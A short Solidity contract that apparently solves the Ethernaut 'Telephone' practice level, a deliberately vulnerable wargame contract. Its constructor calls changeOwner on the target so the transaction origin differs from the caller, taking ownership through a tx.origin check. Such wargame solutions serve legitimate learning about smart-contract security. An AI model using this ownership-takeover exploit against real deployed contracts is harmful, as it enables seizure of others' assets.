// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../ethernaut/levels/Telephone.sol';

contract TelephoneSolution {
  constructor(address targetAddress) {
    Telephone(targetAddress).changeOwner(msg.sender);
  }
}